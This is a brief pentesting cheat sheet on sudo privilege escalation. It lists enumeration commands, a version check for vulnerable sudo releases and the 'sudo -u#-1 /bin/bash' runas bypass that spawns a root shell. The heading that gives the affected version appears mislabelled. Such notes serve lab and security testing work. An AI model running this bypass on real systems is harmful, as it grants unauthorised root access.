# Sudo

Check which commands the current user may run

```sh
sudo -l
```

## sudo version

Check sudo version

```sh
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

## Searchsploit

```sh
searchsploit sudo
```

## sudo < v1.28

```sh
sudo -u#-1 /bin/bash
```
